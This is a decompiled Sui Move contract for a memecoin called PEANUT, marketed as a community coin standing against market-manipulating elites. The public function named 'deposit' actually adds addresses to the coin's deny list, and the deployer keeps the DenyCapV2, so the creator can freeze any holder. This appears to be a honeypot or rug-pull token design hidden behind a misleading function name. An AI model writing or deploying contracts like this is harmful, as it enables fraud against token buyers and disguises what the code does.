module 0xdf9a14613249a9d03fcb0f0cb38aa91049141b3f5ac02556ed89c09e1d32798e::peanut {
    struct PEANUT has drop {
        dummy_field: bool,
    }

    public fun deposit(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<PEANUT>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<PEANUT>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: PEANUT, arg1: &mut 0x2::tx_context::TxContext) {
        let v0 = trim_right(b"111111111   ");
        let v1 = trim_right(b"https://dd.dexscreener.com/ds-data/tokens/solana/bGxHNbsacaVL35pkYWae5PYQDZXSpuQb3QDyW31pump.png?size=lg&key=160ad0                                                                                                                                                                                                             ");
        let v2 = if (0x1::vector::length<u8>(&v1) == 0) {
            0x1::option::none<0x2::url::Url>()
        } else {
            0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(v1))
        };
        let (v3, v4, v5) = 0x2::coin::create_regulated_currency_v2<PEANUT>(arg0, (0x1::vector::length<u8>(&v0) as u8), 0x1::ascii::into_bytes(0x1::string::to_ascii(0x1::string::utf8(trim_right(b"Peanut  ")))), trim_right(b"TikTok Squirre                  "), trim_right(b"Peanut is the true community coin, representing justice for PEANUT. More than just a coin, its a movementa stand against the unfairness of the elite who manipulate the market                                                                                                                                                  "), v2, false, arg1);
        let v6 = v3;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<PEANUT>>(v5);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<PEANUT>>(v6);
        0x2::transfer::public_transfer<0x2::coin::Coin<PEANUT>>(0x2::coin::mint<PEANUT>(&mut v6, 1000000000000000000, arg1), 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<PEANUT>>(v4, 0x2::tx_context::sender(arg1));
    }

    fun trim_right(arg0: vector<u8>) : vector<u8> {
        let v0 = 32;
        let v1 = &v0;
        while (0x1::vector::length<u8>(&arg0) > 0) {
            if (0x1::vector::borrow<u8>(&arg0, 0x1::vector::length<u8>(&arg0) - 1) != v1) {
                break
            };
            0x1::vector::pop_back<u8>(&mut arg0);
        };
        arg0
    }

    // decompiled from Move bytecode v6
}

